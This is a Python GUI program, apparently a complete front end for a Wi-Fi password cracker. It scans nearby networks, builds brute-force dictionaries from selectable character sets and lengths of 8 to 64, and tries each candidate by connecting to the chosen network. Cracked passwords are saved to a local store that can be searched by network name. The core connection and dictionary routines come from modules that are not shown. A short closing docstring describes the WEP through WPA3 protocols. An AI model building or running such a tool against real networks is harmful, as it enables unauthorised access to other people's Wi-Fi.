# 存在的问题是，字典生成器首个密码可能会误判。。。
# 导入所需的模块
import sys
import threading

import wx
from threading import Thread
from wifi_util import get_wifi_list
from WifiControl import WifiControl
import get_any_length_dict_to_crack_code as code
from functools import partial
from backup_json import BackUp

# 定义一个窗口类，继承自wx.Frame
class MyFrame(wx.Frame):
    def __init__(self):
        # self.wifi_list = get_wifi_list()
        self.pwd = ""
        self.wc = WifiControl(self)
        self.bj = BackUp()
        self.res = False
        # 调用父类的构造函数，设置窗口标题和大小
        super().__init__(None, title="WiFi CRACK", size=(800, 700))
        # 设置窗口居中显示
        self.Center()
        # 创建一个面板，作为窗口的容器
        panel = wx.Panel(self)

        # 创建一个静态文本，显示提示信息
        label_net = wx.StaticText(panel, label="请选择一个无线网卡：")
        # 创建一个下拉列表框，显示所有无线网卡
        self.wireless_cards = self.wc.get_all_network_cards_win()
        self.choice_net = wx.Choice(panel, choices=["{} | {} | status:{}".format(name, description, state) for
                                                    name, description, guid, state in self.wireless_cards])
        self.choice_net.SetSelection(0)
        self.interface = self.wireless_cards[self.choice_net.GetSelection()][0]
        # print(interface)
        self.wifi_list = get_wifi_list(self.interface)  # wifi列表
        # print("self.wifi_list:", self.wifi_list)
        self.choice_net.Bind(wx.EVT_CHOICE, self.ChoseWireless)
        # 创建一个刷新按钮，用于刷新所有无线网卡列表信息
        self.button_net = wx.Button(panel, label="刷新")
        self.button_net.Bind(wx.EVT_BUTTON, self.refresh_wireless_cards)

        # 创建一个静态文本，显示提示信息
        label0 = wx.StaticText(panel, label="请选择一个WiFi：")
        # 创建一个下拉列表框，显示WiFi名称及强度，并设置默认选项为第一个
        self.choice_wifi = wx.Choice(panel, choices=["{} ({})".format(ssid, signal) for
                                                     ssid, signal, Authentication, Encryption, bssid in self.wifi_list])
        self.choice_wifi.SetSelection(0)
        self.chosed_ssid = self.choice_wifi.GetString(0).split(" ")[0]
        self.choice_wifi.Bind(wx.EVT_CHOICE, self.ChoseWifi)
        # 创建一个刷新按钮，用于刷新所有wifi信息
        self.button_wifi = wx.Button(panel, label="刷新")
        self.button_wifi.Bind(wx.EVT_BUTTON, self.refresh_wifi_info)

        # 创建一个按钮，用于连接选中的WiFi
        button0 = wx.Button(panel, label="连接")
        # 绑定按钮的点击事件，调用on_connect方法
        button0.Bind(wx.EVT_BUTTON, self.on_connect)
        button0.SetMinSize((240, -1))

        # 创建一个静态文本，显示提示信息
        label1 = wx.StaticText(panel, label="密码：                    ")

        # 输入框 （密码）
        self.input0 = wx.TextCtrl(panel, style=wx.TEXT_ATTR_LINE_SPACING)

        # 静态文本 （密码长度）和下拉选择框
        label2 = wx.StaticText(panel, label="请选择密码长度范围(闭区间)：")
        list_len = list(range(8, 65))
        self.choice1 = wx.Choice(panel, choices=["{}".format(i) for i in list_len])
        self.choice1.SetSelection(0)
        self.choice2 = wx.Choice(panel, choices=["{}".format(i) for i in list_len])
        self.choice2.SetSelection(0)
        # 正在破解的密码信息显示
        # self.label_info = wx.TextCtrl(panel, wx.ID_ANY, pos=(0,90), size =(200, 20), style = wx.TE_READONLY)  # 只读文本
        self.label_info = wx.StaticText(panel, label="准备就绪！")
        # self.label_info.SetLabel("hello")

        # choice1.Bind(wx.EVT_CHOICE, self.ChoseItem)
        # 按鈕
        button1 = wx.Button(panel, label="全字符破解")
        button1.Bind(wx.EVT_BUTTON,
                     lambda e, tp=1: self.on_connect_type(e, tp))  # 使用lambda表达式，在绑定事件时给handler函数传入额外的参数
        button2 = wx.Button(panel, label="纯数字")
        button2.Bind(wx.EVT_BUTTON,
                     partial(self.on_connect_type, tp=2))  # 使用functools.partial函数，它可以返回一个新的函数对象，把原函数的某些参数固定住
        button3 = wx.Button(panel, label="纯符号")
        button3.Bind(wx.EVT_BUTTON, lambda e, tp=3: self.on_connect_type(e, tp))
        button4 = wx.Button(panel, label="纯字母(包含大小写)")
        button4.Bind(wx.EVT_BUTTON, lambda e, tp=4: self.on_connect_type(e, tp))
        button5 = wx.Button(panel, label="纯大写字母")
        button5.Bind(wx.EVT_BUTTON, lambda e, tp=5: self.on_connect_type(e, tp))
        button6 = wx.Button(panel, label="纯小写字母")
        button6.Bind(wx.EVT_BUTTON, lambda e, tp=6: self.on_connect_type(e, tp))
        button7 = wx.Button(panel, label="字母(大小写)+数字")
        button7.Bind(wx.EVT_BUTTON, lambda e, tp=7: self.on_connect_type(e, tp))
        button8 = wx.Button(panel, label="大写字母+数字")
        button8.Bind(wx.EVT_BUTTON, lambda e, tp=8: self.on_connect_type(e, tp))
        button9 = wx.Button(panel, label="小写字母+数字")
        button9.Bind(wx.EVT_BUTTON, lambda e, tp=9: self.on_connect_type(e, tp))
        button10 = wx.Button(panel, label="字母(大小写)+符号")
        button10.Bind(wx.EVT_BUTTON, lambda e, tp=10: self.on_connect_type(e, tp))
        button11 = wx.Button(panel, label="大写字母+符号")
        button11.Bind(wx.EVT_BUTTON, lambda e, tp=11: self.on_connect_type(e, tp))
        button12 = wx.Button(panel, label="小写字母+符号")
        button12.Bind(wx.EVT_BUTTON, lambda e, tp=12: self.on_connect_type(e, tp))
        button13 = wx.Button(panel, label="数字+符号")
        button13.Bind(wx.EVT_BUTTON, lambda e, tp=13: self.on_connect_type(e, tp))

        # 输入框 （密码长度）
        self.label3 = wx.StaticText(panel, label="请输入要查找密码的wifi名称（仅能查询本地已破解过的wifi密码）：")
        # 输入框 （密码）
        self.input1 = wx.TextCtrl(panel, style=wx.TEXT_ATTR_LINE_SPACING)
        self.button14 = wx.Button(panel, label="搜索")
        self.button14.Bind(wx.EVT_BUTTON, self.find_pwd)

        hbox_net = wx.BoxSizer(wx.HORIZONTAL)
        hbox_net.Add(label_net, 0, wx.EXPAND | wx.ALL, 5)
        hbox_net.Add(self.choice_net, 1, wx.EXPAND | wx.ALL, 5)
        hbox_net.Add(self.button_net, 1, wx.EXPAND | wx.ALL, 5)

        # 创建一个水平方向的盒子布局管理器，添加静态文本和下拉列表框，并设置间距和对齐方式
        hbox0 = wx.BoxSizer(wx.HORIZONTAL)
        hbox0.Add(label0, 0, wx.EXPAND | wx.ALL, 5)
        hbox0.Add(self.choice_wifi, 1, wx.EXPAND | wx.ALL, 5)
        hbox0.Add(self.button_wifi, 1, wx.EXPAND | wx.ALL, 5)

        # hbox.Add(label1, 0, wx.ALIGN_CENTER_VERTICAL | wx.ALL, 5)

        hbox1 = wx.BoxSizer(wx.HORIZONTAL)
        hbox1.Add(label1, 0, wx.ALIGN_CENTER_VERTICAL | wx.ALL, 5)
        hbox1.Add(self.input0, 100, wx.ALIGN_CENTER | wx.ALL, 5)

        hbox2 = wx.BoxSizer(wx.HORIZONTAL)
        hbox2.Add(label2, 0, wx.EXPAND | wx.ALL, 5)
        hbox2.Add(self.choice1, 0, wx.EXPAND | wx.ALL, 5)
        hbox2.Add(self.choice2, 0, wx.EXPAND | wx.ALL, 5)
        hbox2.Add(self.label_info, 0, wx.EXPAND | wx.ALL, 5)

        hbox3 = wx.BoxSizer(wx.VERTICAL)
        hbox3.Add(button1, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button2, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button3, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button4, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button5, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button6, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button7, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button8, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button9, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button10, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button11, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button12, 100, wx.EXPAND | wx.ALL, 5)
        hbox3.Add(button13, 100, wx.EXPAND | wx.ALL, 5)

        hbox4 = wx.BoxSizer(wx.HORIZONTAL)
        hbox4.Add(self.label3, 100, wx.EXPAND | wx.ALL, 5)
        hbox4.Add(self.input1, 100, wx.EXPAND | wx.ALL, 5)
        hbox4.Add(self.button14, 100, wx.EXPAND | wx.ALL, 5)

        # 创建一个垂直方向的盒子布局管理器，添加水平布局管理器和按钮，并设置间距和对齐方式
        vbox = wx.BoxSizer(wx.VERTICAL)
        vbox.Add(hbox_net, 0, wx.EXPAND)
        vbox.Add(hbox0, 0, wx.EXPAND)
        vbox.Add(hbox1, 0, wx.EXPAND)
        # vbox.Add(input0, 0, wx.ALIGN_CENTER | wx.ALL, 5)
        vbox.Add(button0, 0, wx.EXPAND | wx.ALL, 5)
        vbox.Add(hbox2, 0, wx.EXPAND | wx.ALL, 5)
        vbox.Add(hbox3, 0, wx.EXPAND | wx.ALL, 5)
        vbox.Add(hbox4, 0, wx.EXPAND | wx.ALL, 5)

        # 设置面板的布局管理器为垂直布局管理器
        panel.SetSizer(vbox)
        # 定义一个方法，用于处理按钮的点击事件

    def find_pwd__(self):
        wifi_name = self.input1.GetLineText(0)
        frame = wx.Frame(None, title="hello", size=(300, 200))
        backup = self.bj.get_back_up()  # 获取保存的密码字典
        # 查找密码字典
        if wifi_name in backup:  # key在字典里
            pwds = backup[wifi_name]
            info = ""
            for i in range(len(pwds)):
                info += str(i+1)+": "+pwds[i]+'\n'
            self.dialog = wx.MessageDialog(frame, info, "ok:",
                                           wx.OK | wx.ICON_INFORMATION)
            self.dialog.ShowModal()
        else:
            # 不存在记录
            info = "不存在记录！"
            self.dialog = wx.MessageDialog(frame, info, "error:",
                                           wx.OK | wx.ICON_INFORMATION)
            self.dialog.ShowModal()

    def find_pwd(self, event):
        try:
            t = Thread(target=self.find_pwd__)
            t.daemon = True
            t.start()

        except:
            print("find_pwd Error: unable to start thread")

    def ChoseWireless(self, event):
        self.wireless_id = self.choice_net.GetSelection()
        self.interface = self.wireless_cards[self.choice_net.GetSelection()][0]
        # print(self.interface)
        # wireless = event.GetString()
        self.wc.chose_wireless_card(self.wireless_id)  # 将无线网卡name传给wificontrol,wificontrol里的方法都会针对这个网卡执行
        # print(self.wireless_id, wireless, "被选中")
        # 弹窗提醒选择的无线网卡
        frame = wx.Frame(None, title="hello", size=(300, 200))
        chosen_wireless = self.wireless_cards[self.choice_net.GetSelection()]
        info = "name:" + chosen_wireless[0] + ";  description:" + chosen_wireless[1] + ";  guid:" + chosen_wireless[
            2] + ";  state:" + chosen_wireless[3]
        self.dialog = wx.MessageDialog(frame, info, "chosen wireless:",
                                       wx.OK | wx.ICON_INFORMATION)
        self.dialog.ShowModal()

    def refresh_wireless_cards(self, event):
        self.wireless_cards = self.wc.get_all_network_cards_win()
        # 更新下拉列表
        self.choice_net.SetItems(
            ["{} | {} | status:{}".format(name, description, state) for name, description, guid, state in
             self.wireless_cards])

    def ChoseWifi(self, event):
        item = event.GetSelection()
        # print(item, event.GetString()+'被选中')
        # 弹窗提醒选择的wifi
        frame = wx.Frame(None, title="hello", size=(300, 200))
        chosen_wifi = self.wifi_list[self.choice_wifi.GetSelection()]
        info = "ssid:" + chosen_wifi[0] + ";  signal:" + chosen_wifi[1] + ";  Authentication:" + chosen_wifi[
            2] + ";  Encryption:" + chosen_wifi[3]
        self.dialog = wx.MessageDialog(frame, info, "chosen wifi:",
                                       wx.OK | wx.ICON_INFORMATION)
        self.dialog.ShowModal()

    def refresh_wifi_info(self, event):
        self.wifi_list = get_wifi_list(self.interface)
        # 更新下拉列表
        self.choice_wifi.SetItems(
            ["{} ({})".format(ssid, signal) for ssid, signal, Authentication, Encryption, bssid in self.wifi_list])

    def on_connect__(self):
        item = self.choice_wifi.GetSelection()
        frame = wx.Frame(None, title="hello", size=(300, 200))
        if -1 == item:  # 没有选中任何wifi
            print("请选择一个wifi")
            info = "请先选择一个wifi"
            self.dialog = wx.MessageDialog(frame, info, "choose a wifi:",
                                           wx.OK | wx.ICON_INFORMATION)
            self.dialog.ShowModal()
        else:
            ssid = self.wifi_list[item][0]
            password = self.input0.GetLineText(0)
            Authentication = self.wifi_list[item][2]  # 加密方式
            Encryption = self.wifi_list[item][3]  # 加密单元
            result = self.wc.wifi_connect(ssid, password, Authentication, Encryption, True)
            if result:
                info = "成功连接"
                self.dialog = wx.MessageDialog(frame, info, "choose a wifi:",
                                               wx.OK | wx.ICON_INFORMATION)
                self.dialog.ShowModal()
            else:
                info = "密码错误，连接失败！"
                self.dialog = wx.MessageDialog(frame, info, "choose a wifi:",
                                               wx.OK | wx.ICON_INFORMATION)
                self.dialog.ShowModal()

    def on_connect(self, event):
        try:
            t = Thread(target=self.on_connect__)
            t.daemon = True
            t.start()

        except:
            print("on_connect Error: unable to start thread")


    def code_region(self):
        # 获取密码长度范围
        start = self.choice1.GetSelection() + 8
        end = self.choice2.GetSelection() + 8
        return start, end

    def get_choen_wifi_info(self):
        item = self.choice_wifi.GetSelection()
        ssid = self.wifi_list[item][0]
        Authentication = self.wifi_list[item][2]  # 加密方式
        Encryption = self.wifi_list[item][3]  # 加密单元
        return ssid, Authentication, Encryption

    def on_connect_type__(self, stop_event, start, end, dic, ssid, Authentication, Encryption, frame):
        while not stop_event.is_set():
            try:
                for key in range(start, end + 1):
                    # print("dic[i]", dic[key])
                    pwd = self.wc.wifi_connect_test(dic[key], ssid, Authentication, Encryption)
                    if "" != pwd:
                        print("找到密码是：", pwd)
                        info = "已找到密码，为" + pwd
                        self.dialog = wx.MessageDialog(frame, info, "wifi passward:",
                                                       wx.OK | wx.ICON_INFORMATION)
                        self.dialog.ShowModal()
                        # 存储密码...
                        backup = self.bj.get_back_up()
                        # 判断key是否存在
                        if ssid in backup:
                            # 判断value存不存在
                            # 遍历字典并获取特定键对应的所有值
                            values = [value for key, value in backup.items() if key == ssid]
                            # print(values)
                            if pwd not in values[0]:  # 不存在
                                # print("不存在？？")
                                backup[ssid].append(pwd)
                        else:
                            backup[ssid] = []
                            backup[ssid].append(pwd)
                        # print(backup)
                        self.bj.write_back_up()
                        self.res = True
                self.res = False
            except Exception as e:
                print("on_connect_type__ Error: unable to start thread", e)
                # 终止子线程
                stop_event.set()

    def on_connect_type(self, event, tp):
        # 密码长度区间
        start, end = self.code_region()
        # print(start, end)
        # 选择的wifi信息
        ssid, Authentication, Encryption = self.get_choen_wifi_info()
        # print(type(ssid))
        # print(ssid, Authentication, Encryption)
        frame = wx.Frame(None, title="hello", size=(300, 200))
        if start > end:  # 不合规
            print("区间不合法")
            info = "密码长度区间输入不合法，请重新选择！"
            self.dialog = wx.MessageDialog(frame, info, "error:",
                                           wx.OK | wx.ICON_INFORMATION)
            self.dialog.ShowModal()
        else:
            dic = code.all_password_generator(start, end, tp - 1)
            # print("dic", dic)
            # if not self.on_connect_type__(start, end, dic, ssid, Authentication, Encryption, frame):
            #     info = "破解失败，信号不稳定，或者密码长度或者字符组合不对，请重新尝试！"
            #     self.dialog = wx.MessageDialog(frame, info, "error:",
            #                                    wx.OK | wx.ICON_INFORMATION)
            #     self.dialog.ShowModal()
            # 开辟一个线程去执行密码破解流程
            try:
                # 创建一个事件控制线程退出
                # self.stop_event = threading.Event()
                stop_event = threading.Event()
                t = Thread(target=self.on_connect_type__, args=(stop_event, start, end, dic, ssid, Authentication, Encryption, frame))

                # t.setDaemon(True)  # 设置线程为守护线程，防止退出主线程时，子线程仍在运行 setDaemon() is deprecated, set the daemon attribute instead
                t.daemon = True
                t.start()
                # t.join()  # 线程等待
                # 线程结束并且没匹配到密码
                if not t.is_alive() and not self.res:
                    info = "破解失败，信号不稳定，或者密码长度或者字符组合不对，请重新尝试！"
                    self.dialog = wx.MessageDialog(frame, info, "error:",
                                                   wx.OK | wx.ICON_INFORMATION)
                    self.dialog.ShowModal()
            except Exception as e:
                print("on_connect_type Error: unable to start thread", e)


# 定义一个应用程序类，继承自wx.App
class MyApp(wx.App):
    def OnInit(self):
        # 创建窗口对象并显示
        frame = MyFrame()
        frame.Show()
        return True

    def loop(self):
        print("hello")

    # 重构 def closeEvent(self, event)——在UI线程销毁的时候，需要把后台线程也销毁掉
    def closeEvent(self, event):
        # self.stop_event.set()
        sys.exit(app.exec_())


# 如果是主模块，则运行应用程序对象的主循环
if __name__ == "__main__":
    app = MyApp()
    app.MainLoop()

# 加密方式
'''
- **WEP**（Wired Equivalent Privacy）：这是最早的一种Wifi加密协议，它使用相同的密钥对数据进行加密和解密，属于对称加密¹。但是，由于WEP的密钥容易被破解，它已经被认为是不安全的，不建议使用²。
- **WPA**（Wi-Fi Protected Access）：这是一种改进的Wifi加密协议，它使用动态的密钥分配和认证机制，提高了数据的安全性。WPA有两个版本，分别是WPA-Personal（适用于个人和家庭用户）和WPA-Enterprise（适用于企业和组织用户）²。
- **WPA2**：这是WPA的升级版，它使用了更高级的加密算法（AES）和更强大的认证协议（802.1X），提供了更高的安全性。WPA2也有两个版本，分别是WPA2-Personal和WPA2-Enterprise²。
- **WPA3**：这是最新的一种Wifi加密协议，它在WPA2的基础上增加了更多的安全特性，例如更强的密码保护、更好的隐私保护、更高的加密强度等。WPA3同样有两个版本，分别是WPA3-Personal和WPA3-Enterprise³。
'''
